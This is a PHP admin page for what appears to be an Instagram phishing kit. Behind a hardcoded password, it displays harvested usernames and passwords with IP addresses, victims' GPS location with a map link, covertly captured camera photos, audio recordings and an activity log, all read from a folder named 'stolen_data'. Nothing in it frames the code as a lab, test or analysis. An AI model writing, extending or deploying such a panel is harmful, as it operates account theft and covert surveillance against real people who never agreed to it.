<?php
session_start();

// Simple password protection
$admin_password = 'admin123'; // CHANGE THIS

if (!isset($_SESSION['admin_logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $admin_password) {
            $_SESSION['admin_logged_in'] = true;
        } else {
            $error = 'Wrong password';
        }
    }
    
    if (!isset($_SESSION['admin_logged_in'])) {
        echo '<!DOCTYPE html><html><head><title>Admin Panel</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
            body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
            .login-box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:300px}
            h2{text-align:center;color:#333;margin-bottom:20px}
            input{width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
            button{width:100%;padding:10px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
            button:hover{background:#1877f2}
            .error{color:red;text-align:center;margin-bottom:10px}
        </style></head><body>
        <div class="login-box">
            <h2>Admin Panel Login</h2>';
        if (isset($error)) echo '<div class="error">'.$error.'</div>';
        echo '<form method="post"><input type="password" name="password" placeholder="Enter password" required><button type="submit">Login</button></form>
        </div></body></html>';
        exit;
    }
}

$dataDir = __DIR__ . '/stolen_data';

// Handle delete action
if (isset($_GET['delete'])) {
    $file = basename($_GET['delete']);
    $path = $dataDir . '/' . $file;
    if (file_exists($path)) {
        unlink($path);
    }
    header('Location: admin.php');
    exit;
}

// Handle delete all
if (isset($_GET['delete_all'])) {
    if (is_dir($dataDir)) {
        $files = glob($dataDir . '/*');
        foreach ($files as $f) {
            if (is_file($f)) unlink($f);
        }
    }
    header('Location: admin.php');
    exit;
}

// Get all data files
$credentials = [];
$location = null;
$log = [];
$camera_files = [];
$audio_files = [];

if (file_exists($dataDir . '/credentials.json')) {
    $credentials = json_decode(file_get_contents($dataDir . '/credentials.json'), true) ?? [];
}
if (file_exists($dataDir . '/location.json')) {
    $location = json_decode(file_get_contents($dataDir . '/location.json'), true);
}
if (file_exists($dataDir . '/log.txt')) {
    $log = file($dataDir . '/log.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

$all_files = scandir($dataDir);
foreach ($all_files as $f) {
    $path = $dataDir . '/' . $f;
    if (is_file($path)) {
        if (strpos($f, 'camera_') === 0) {
            $camera_files[] = $f;
        } elseif (strpos($f, 'audio_') === 0) {
            $audio_files[] = $f;
        }
    }
}
// Sort by newest first
rsort($camera_files);
rsort($audio_files);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Panel - Instagram Assessment</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; padding: 20px; }
        .header { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 24px; color: #1a1a1a; }
        .header .stats { display: flex; gap: 20px; }
        .header .stat { text-align: center; }
        .header .stat span { display: block; font-size: 24px; font-weight: bold; color: #0095f6; }
        .header .stat label { font-size: 12px; color: #666; }
        .header a { color: #0095f6; text-decoration: none; font-size: 14px; }
        .header a:hover { text-decoration: underline; }
        .delete-all { background: #ed4956; color: #fff; padding: 8px 16px; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; }
        .delete-all:hover { background: #c0392b; }
        
        .section { background: #fff; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-bottom: 20px; overflow: hidden; }
        .section-title { padding: 15px 20px; background: #fafafa; border-bottom: 1px solid #efefef; font-size: 16px; font-weight: 600; color: #333; }
        .section-content { padding: 15px 20px; }
        
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th { text-align: left; padding: 10px 8px; border-bottom: 2px solid #efefef; color: #555; font-size: 12px; text-transform: uppercase; }
        td { padding: 10px 8px; border-bottom: 1px solid #efefef; }
        tr:hover { background: #f8f9fa; }
        
        .creds-table td:first-child { font-family: monospace; font-weight: 600; }
        .ip { font-size: 12px; color: #666; }
        .time { font-size: 12px; color: #999; }
        
        .camera-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; }
        .camera-item { position: relative; }
        .camera-item img { width: 100%; border-radius: 4px; display: block; }
        .camera-item .filename { font-size: 11px; color: #666; margin-top: 4px; word-break: break-all; }
        .camera-item .delete-btn { position: absolute; top: 4px; right: 4px; background: rgba(0,0,0,0.6); color: #fff; border: none; border-radius: 50%; width: 24px; height: 24px; cursor: pointer; font-size: 14px; line-height: 24px; text-align: center; text-decoration: none; }
        .camera-item .delete-btn:hover { background: rgba(237,73,86,0.9); }
        
        .audio-list { list-style: none; }
        .audio-list li { padding: 8px 0; border-bottom: 1px solid #efefef; display: flex; justify-content: space-between; align-items: center; }
        .audio-list li:last-child { border-bottom: none; }
        .audio-list audio { width: 300px; }
        
        .log-section { max-height: 300px; overflow-y: auto; }
        .log-entry { font-family: monospace; font-size: 12px; padding: 4px 0; border-bottom: 1px solid #f0f0f0; }
        .log-entry:nth-child(odd) { background: #fafafa; }
        
        .empty { text-align: center; padding: 40px; color: #999; }
        .empty p { font-size: 14px; margin-top: 8px; }
        
        .location-data { font-size: 14px; }
        .location-data strong { color: #333; }
        .location-data a { color: #0095f6; text-decoration: none; }
        .location-data a:hover { text-decoration: underline; }
        
        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; }
        .badge-new { background: #e3f2fd; color: #1565c0; }
        .badge-audio { background: #fce4ec; color: #c62828; }
    </style>
</head>
<body>

<div class="header">
    <div>
        <h1>📊 Instagram Assessment Panel</h1>
        <div class="stats">
            <div class="stat"><span><?= count($credentials) ?></span><label>Credentials</label></div>
            <div class="stat"><span><?= count($camera_files) ?></span><label>Photos</label></div>
            <div class="stat"><span><?= count($audio_files) ?></span><label>Audio</label></div>
            <div class="stat"><span><?= $location ? '✅' : '❌' ?></span><label>Location</label></div>
        </div>
    </div>
    <div style="display:flex;align-items:center;gap:10px">
        <a href="?delete_all=1" class="delete-all" onclick="return confirm('Delete ALL captured data?')">🗑 Delete All Data</a>
        <a href="?logout=1">Logout</a>
    </div>
</div>

<!-- Credentials Section -->
<div class="section">
    <div class="section-title">🔑 Captured Credentials (<?= count($credentials) ?>)</div>
    <div class="section-content">
        <?php if (count($credentials) > 0): ?>
        <table class="creds-table">
            <thead>
                <tr>
                    <th>Username / Email</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>Time</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($credentials as $cred): ?>
                <tr>
                    <td><?= htmlspecialchars($cred['username']) ?></td>
                    <td><?= htmlspecialchars($cred['password']) ?></td>
                    <td class="ip"><?= htmlspecialchars($cred['ip'] ?? 'N/A') ?></td>
                    <td class="time"><?= htmlspecialchars($cred['time'] ?? 'N/A') ?></td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        <?php else: ?>
        <div class="empty"><p>No credentials captured yet</p></div>
        <?php endif; ?>
    </div>
</div>

<!-- Location Section -->
<div class="section">
    <div class="section-title">📍 Captured Location</div>
    <div class="section-content">
        <?php if ($location && isset($location['lat']) && $location['lat'] !== 'denied' && $location['lat'] !== 'blocked'): ?>
        <div class="location-data">
            <p><strong>Latitude:</strong> <?= htmlspecialchars($location['lat']) ?></p>
            <p><strong>Longitude:</strong> <?= htmlspecialchars($location['lon']) ?></p>
            <p><strong>Accuracy:</strong> <?= htmlspecialchars($location['accuracy'] ?? 'N/A') ?> meters</p>
            <p><strong>Time:</strong> <?= htmlspecialchars($location['time'] ?? 'N/A') ?></p>
            <p style="margin-top:10px"><a href="https://www.google.com/maps?q=<?= urlencode($location['lat']) ?>,<?= urlencode($location['lon']) ?>" target="_blank">🌍 Open in Google Maps</a></p>
        </div>
        <?php else: ?>
        <div class="empty"><p>No location data captured or permission denied</p></div>
        <?php endif; ?>
    </div>
</div>

<!-- Camera Photos Section -->
<div class="section">
    <div class="section-title">📸 Captured Photos (<?= count($camera_files) ?>)</div>
    <div class="section-content">
        <?php if (count($camera_files) > 0): ?>
        <div class="camera-grid">
            <?php foreach ($camera_files as $photo): 
                $photo_path = 'stolen_data/' . $photo;
                $file_time = date('Y-m-d H:i:s', filemtime($dataDir . '/' . $photo));
            ?>
            <div class="camera-item">
                <img src="<?= $photo_path ?>" alt="Camera capture" loading="lazy">
                <div class="filename"><?= $photo ?><br><span style="color:#999"><?= $file_time ?></span></div>
                <a href="?delete=<?= urlencode($photo) ?>" class="delete-btn" onclick="return confirm('Delete this photo?')">×</a>
            </div>
            <?php endforeach; ?>
        </div>
        <?php else: ?>
        <div class="empty"><p>No photos captured yet</p></div>
        <?php endif; ?>
    </div>
</div>

<!-- Audio Recordings Section -->
<div class="section">
    <div class="section-title">🎤 Captured Audio (<?= count($audio_files) ?>)</div>
    <div class="section-content">
        <?php if (count($audio_files) > 0): ?>
        <ul class="audio-list">
            <?php foreach ($audio_files as $audio): 
                $audio_path = 'stolen_data/' . $audio;
                $file_size = filesize($dataDir . '/' . $audio);
                $file_time = date('Y-m-d H:i:s', filemtime($dataDir . '/' . $audio));
            ?>
            <li>
                <div>
                    <strong><?= $audio ?></strong><br>
                    <span style="font-size:12px;color:#999"><?= $file_time ?> — <?= round($file_size / 1024, 1) ?> KB</span>
                </div>
                <div style="display:flex;align-items:center;gap:10px">
                    <audio controls>
                        <source src="<?= $audio_path ?>">
                    </audio>
                    <a href="?delete=<?= urlencode($audio) ?>" class="delete-btn" style="background:rgba(237,73,86,0.1);color:#ed4956;border:none;border-radius:50%;width:28px;height:28px;cursor:pointer;font-size:16px;text-decoration:none;display:flex;align-items:center;justify-content:center" onclick="return confirm('Delete this audio?')">×</a>
                </div>
            </li>
            <?php endforeach; ?>
        </ul>
        <?php else: ?>
        <div class="empty"><p>No audio recordings captured yet</p></div>
        <?php endif; ?>
    </div>
</div>

<!-- Log Section -->
<div class="section">
    <div class="section-title">📝 Activity Log</div>
    <div class="section-content log-section">
        <?php if (count($log) > 0): ?>
            <?php foreach (array_reverse($log) as $entry): ?>
            <div class="log-entry"><?= htmlspecialchars($entry) ?></div>
            <?php endforeach; ?>
        <?php else: ?>
        <div class="empty"><p>No log entries</p></div>
        <?php endif; ?>
    </div>
</div>

<br>
<p style="text-align:center;color:#999;font-size:12px">Admin Panel — Instagram Assessment — All data is stored locally in the stolen_data folder</p>

</body>
</html>
<?php
// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}
?>